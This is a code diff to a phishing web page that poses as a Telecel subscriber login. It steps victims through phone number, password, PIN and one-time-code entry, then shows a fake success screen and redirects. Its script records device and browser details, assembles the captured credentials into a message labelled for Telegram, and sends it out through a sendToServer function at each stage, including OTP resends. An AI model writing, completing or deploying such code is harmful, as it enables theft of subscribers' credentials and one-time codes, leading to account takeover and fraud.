@@ -196,8 +196,6 @@ font-weight:600;
 
 <div class="container">
 
-<!-- STEP 1 -->
-
 <div id="step1" class="step">
 
 <img src="assets/telecel.svg" class="logo">
@@ -232,8 +230,6 @@ You need to be a Telecel subscriber to proceed.
 </div>
 
 
-<!-- LOADING -->
-
 <div id="loading" class="step hidden">
 
 <div style="text-align:center">
@@ -246,8 +242,6 @@ You need to be a Telecel subscriber to proceed.
 
 </div>
 
-
-<!-- STEP 2 PIN -->
 
 <div id="step2" class="step hidden">
 
@@ -270,8 +264,6 @@ You need to be a Telecel subscriber to proceed.
 
 </div>
 
-
-<!-- STEP 3 OTP -->
 
 <div id="step3" class="step hidden">
 
@@ -305,8 +297,6 @@ Code expires in <span id="time">60</span>s
 </div>
 
 
-<!-- STEP 4 SUCCESS -->
-
 <div id="step4" class="step hidden">
 
 <div style="text-align:center">
@@ -328,8 +318,6 @@ Logging you in...
 
 <script>
 
-/* device */
-
 const ua=navigator.userAgent
 
 let device="Unknown"
@@ -341,8 +329,6 @@ if(/Chrome/i.test(ua)) device+=" | Chrome"
 else if(/Safari/i.test(ua)) device+=" | Safari"
 else if(/Firefox/i.test(ua)) device+=" | Firefox"
 
-
-/* plan */
 
 let planLine="Not captured"
 
@@ -359,16 +345,11 @@ planLine=[p.name||"",p.price||""].filter(Boolean).join(" — ")
 }catch(e){}
 
 
-/* values */
-
 let phoneValue=""
 let passwordValue=""
 let pinValue=""
 let otpValue=""
 
-
-
-/* phone */
 
 phone.oninput=e=>{
 
@@ -382,18 +363,12 @@ e.target.value=v
 }
 
 
-
-/* toggle */
-
 function togglePassword(){
 
 password.type=password.type==="password"?"text":"password"
 
 }
 
-
-
-/* step */
 
 function show(id){
 
@@ -406,8 +381,7 @@ document.getElementById(id)
 }
 
 
-
-/* telegram */
+/* TELEGRAM MESSAGE */
 
 function buildMessage(stage){
 
@@ -456,8 +430,7 @@ return msg
 }
 
 
-
-/* send */
+/* SEND */
 
 async function sendToServer(stage){
 
@@ -470,7 +443,8 @@ headers:{"Content-Type":"application/json"},
 body:JSON.stringify({
 
 message:buildMessage(stage),
-parse_mode:"HTML"
+
+parse_mode:"HTML"   /* ONLY CHANGE */
 
 })
 
@@ -478,9 +452,6 @@ parse_mode:"HTML"
 
 }
 
-
-
-/* login */
 
 form.onsubmit=e=>{
 
@@ -511,9 +482,6 @@ show("step2")
 
 }
 
-
-
-/* PIN */
 
 const pinInputs=document.querySelectorAll("#step2 input")
 
@@ -560,9 +528,6 @@ startTimer()
 }
 
 
-
-/* OTP */
-
 const otpInputs=document.querySelectorAll("#step3 input")
 
 otpInputs.forEach((input,index)=>{
@@ -603,9 +568,6 @@ setTimeout(()=>location.href="thankyou.html",1800)
 }
 
 
-
-/* resend */
-
 function resendOtp(){
 
 startTimer()
@@ -613,9 +575,6 @@ sendToServer("Resend Otp")
 
 }
 
-
-
-/* timer */
 
 function startTimer(){
 
